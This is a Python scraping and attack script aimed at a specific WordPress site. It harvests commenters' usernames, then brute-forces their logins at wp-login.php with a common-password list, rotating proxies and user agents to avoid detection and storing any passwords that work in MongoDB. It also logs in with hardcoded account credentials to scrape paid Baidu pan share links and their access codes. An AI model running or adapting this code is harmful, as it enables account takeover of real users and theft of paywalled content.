# -*- coding: UTF-8 -*-
import requests, re, random, datetime, functools, time
from lxml import etree
from pymongo import MongoClient
from multiprocessing.dummy import Pool as ThreadPool
class Ccba():
    def __init__(self):
        self.data = {'log': 'meijida258',
                'pwd': 'jijida258',
                'wp-submit': u'登录',
                'redirect_to': 'http://ccba.me/wp-admin/',
                'testcookie': '1'}
        self.headersList = [
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1Safari/534.50',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
            'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)']
        self.ses = requests.session()
        self.proxies = mon.getProxy()
        self.headers = {
            'Host': 'ccba.me',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            'Accept-Encoding': "gzip, deflate",
            'Referer': "http://ccba.me/wp-login.php",
            'Connection': 'keep-alive',
            'Content-Type': "application/x-www-form-urlencoded",
        }

    def getCookie(self):
        cookies = self.ses.get('http://ccba.me/wp-login.php', headers=self.headers).cookies
        cookies = self.ses.post('http://ccba.me/wp-login.php', cookies=cookies, data=self.data,
                                     headers=self.headers,
                                     allow_redirects=False).cookies
        return cookies

    def getArticleListHtml(self):
        while True:
            try:
                print '获取主页html'
                proxies = self.proxies[random.randint(0, len(self.proxies) - 2)]
                total_page_html = requests.get('http://ccba.me/vip',timeout=30,
                                               proxies=proxies,
                                               headers={'User-Agent': self.headersList[
                                                   datetime.datetime.now().timetuple().tm_sec / 10]}).content
                return total_page_html
            except Exception, e:
                print 'article List Html获取失败' + str(e.args)

    def getArticleList(self):
        articleListHtml = self.getArticleListHtml()
        selector = etree.HTML(articleListHtml)
        articleList = []
        for eachPostBox in selector.xpath('//*[@id="post_container"]/li'):
            articleList.append(eachPostBox.xpath('div/a/@href')[0])
        return articleList

    def getArticleHtml(self, url, cookie):
        while True:
            try:
                time.sleep(random.uniform(0, 2))
                articleHtml = requests.get(url, timeout=30,cookies=cookie, headers={'User-Agent': self.headersList[
                                                           datetime.datetime.now().timetuple().tm_sec / 10]}).content
                return articleHtml
            except Exception, e:
                print  'article Html获取失败' + str(e.args)

    def getArticleUser(self, articleHtml):
        print '开始获取当前文章用户名'
        selector = etree.HTML(articleHtml)
        for userInfo in selector.xpath('//*[@class="commentlist"]/li'):
            user  = {}
            try:
                user['name'] = userInfo.xpath('div/div[@class="comment-cont"]/strong/text()')[0]
                user['from'] = selector.xpath('html/head/title/text()'[0])
                if mon.userCollection.find({'name': user['name']}).count() == 0:
                    mon.userCollection.insert(user)
                    print '录入一条信息'
            except Exception:
                pass

    def firstStep(self):
        articleList = self.getArticleList()
        cookie = self.getCookie()
        for article in articleList:
            articleHtml = self.getArticleHtml(article, cookie)
            self.getArticleUser(articleHtml)

    def passWordTest(self, name):
        name = name.encode('utf-8')
        passwords = ['abc123', '123456', 'xiaoming', '12345678', 'iloveyou','admin', 'qq123456', 'taobao', 'root', 'wang1234']
        passwords.append(name)
        proxies = mon.getProxy()
        for password in passwords:
            print '%s正在尝试密码：%s' %(name, password)
            data = {'log': name,
                    'pwd': password,
                    'wp-submit': u'登录',
                    'redirect_to': 'http://ccba.me/wp-admin/',
                    'testcookie': '1'}
            ses = requests.session()
            while True:
                try:
                    time.sleep(random.uniform(0, 3))
                    useProxies = proxies[random.randint(0, len(proxies) - 2)]
                    cookies = ses.get('http://ccba.me/wp-login.php',timeout=10, headers=self.headers,proxies=useProxies).cookies
                    cookiesKeys = ses.post('http://ccba.me/wp-login.php',proxies=useProxies,timeout=10, cookies=cookies, data=data,
                                            headers=self.headers,
                                            allow_redirects=False).cookies
                    print cookiesKeys
                    if str(cookiesKeys).find('wordpress_logged_in') > 0:
                        mon.userCollection.update({'name':name}, {'$set':{'password':password}})
                        print '%s尝试的密码：%s有效， 录入mongo' %(name, password)
                        return True
                    elif password == name:
                        mon.userCollection.remove({'name': name})
                        print '%s尝试的所有密码无效， 删除' % (name)
                        return False
                    else:
                        print '%s尝试的密码：%s无效， 测试下一个' % (name, password)
                        break
                except Exception, e:
                    print useProxies
                    print '代理出错，重试' + str(e.args)

    def secondStep(self):
        userDicts = mon.userCollection.find()
        userList = []
        for userDict in userDicts:
            userList.append(userDict['name'])
        pool = ThreadPool(4)
        pool.map(self.passWordTest, userList)
        pool.close()
        pool.join()

    def getBaiDuYunLink(self, url, cookiesKeys):
        html = requests.get(url, timeout=60, headers=self.headers, cookies=cookiesKeys).content
        return html

    def getContent(self, html):
        nameList = re.findall(r'<h3><span>(.*?)</span></h3>', html)
        if nameList:
            return nameList
        else:
            return None
    def getContentLink(self, html):
        contentList = re.findall('<a href="(http://pan\.baidu\.com/s/.*?)" .+?密码(.*?)</div>', html)
        for eachContent in re.findall('<a href="(https://pan\.baidu\.com/s/.*?)" .+?密码(.*?)</div>', html):
            contentList.append(eachContent)
        if contentList:
            return contentList
        else:
            return None

    def getBaiDuLink(self, baseUrl, page, cookiesKeys):
        url = re.sub(r'\.html', '-%s.html' % page, baseUrl)
        print '获取%s的html' %url
        html = self.getBaiDuYunLink(url, cookiesKeys)
        try:
            articleTitle = re.findall('<title>(.*?)</title>', html)[0]
        except IndexError:
            articleTitle = '暂无'
        if html.find('Error 404 - Not Found') > 0:
            print '未找到网页，可能因为已经最后一页'
            return None
        namelist = self.getContent(html)
        contentList = self.getContentLink(html)
        print contentList
        if contentList:
            if namelist:
                if len(namelist) == len(contentList):
                    count = len(contentList)
                else:
                    count = len(contentList)
                    namelist = range(1, count + 1)
            else:
                count = len(contentList)
                namelist = range(1, count + 1)
            for i in range(0, count):
                contentDict = {}
                contentDict['name'] = namelist[i]
                contentDict['link'] = contentList[i][0]
                contentDict['password'] = contentList[i][1][-4:]
                contentDict['articleTitle'] = articleTitle
                if mon.baiDuLinkCollection.find({'link':contentDict['link']}).count() == 0:
                    mon.baiDuLinkCollection.insert(contentDict)
                    print '录入一条消息'
                else:
                    print '该页重复'
                    return None
        page += 1
        self.getBaiDuLink(baseUrl, page, cookiesKeys)

    def getBaiDuLinkMain(self):
        data = {'log': '65769436 ',
                'pwd': '65769436 ',
                'wp-submit': u'登录',
                'redirect_to': 'http://ccba.me/wp-admin/',
                'testcookie': '1'}
        ses = requests.session()
        baseCookies = ses.get('http://ccba.me/wp-login.php', timeout=15, headers=self.headers).cookies
        cookiesKeys = ses.post('http://ccba.me/wp-login.php', timeout=15, cookies=baseCookies, data=data,
                               headers=self.headers,
                               allow_redirects=False).cookies
        urls = ['http://ccba.me/47784.html', 'http://ccba.me/47143.html', 'http://ccba.me/46798.html', 'http://ccba.me/46313.html', 'http://ccba.me/45974.html', 'http://ccba.me/45387.html', 'http://ccba.me/44987.html', 'http://ccba.me/44822.html', 'http://ccba.me/44192.html', 'http://ccba.me/43616.html', 'http://ccba.me/43158.html', 'http://ccba.me/42624.html', 'http://ccba.me/41879.html', 'http://ccba.me/41374.html', 'http://ccba.me/40551.html', 'http://ccba.me/39814.html', 'http://ccba.me/38947.html', 'http://ccba.me/37805.html']

        startPage = 1
        for url in urls[:1]:
            self.getBaiDuLink(url, startPage, cookiesKeys)
class Mongo():
    def __init__(self):
        self.client = MongoClient('localhost', 27017)
        self.proxyDb = self.client.Proxy
        self.proxyCollection = self.proxyDb.Ip

        self.userDb = self.client.Ccba
        self.userCollection = self.userDb.user

        self.baiDuLinkDb = self.client.Ccba
        self.baiDuLinkCollection = self.baiDuLinkDb.link
    def getProxy(self): # 返回{'http': 'http://*.*.*.*'}格式的代理列表
        proxies = []
        proxyDicts = self.proxyCollection.find()
        for proxyDict in proxyDicts:
            proxiesDict = {}
            proxiesStr = 'http://%s' % proxyDict['proxy']
            proxiesDict['http'] = proxiesStr
            proxies.append(proxiesDict)
        return proxies

if __name__ == '__main__':
    mon = Mongo()
    cba = Ccba()
    cba.getBaiDuLinkMain()

